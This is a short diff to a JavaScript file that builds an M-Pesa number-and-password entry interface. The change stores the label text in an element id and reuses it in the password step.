@@ -132,6 +132,7 @@ function put_number(){
 		  element_2.appendChild(element_3);
 		  var element_ = document.createElement("div");
 		  element_.style.marginTop = 5 + "%";
+		  element_.id = "text_about";
 		  element_3.appendChild(element_);
 		  element_.innerHTML = "M-Pesa";
 		  var element_4 = document.createElement("div");
@@ -182,7 +183,8 @@ function put_number(){
 		return false;  
 	}
 function put_password(){
-	       remove_no();
+	      var take_text = document.querySelector("#text_about").innerHTML; 
+	                  remove_no();
 	      var element = document.createElement("div");
 		  element.className = "varify_mpesa";
 		  document.body.appendChild(element);
@@ -196,7 +198,7 @@ function put_password(){
 		  var element_ = document.createElement("div");
 		  element_.style.marginTop = 5 + "%";
 		   element_3.appendChild(element_);
-		  element_.innerHTML = tx;
+		  element_.innerHTML = take_text;
 		   var element_4 = document.createElement("div");
 		  element_4.className = "buy_msg";
 		  element_2.appendChild(element_4);
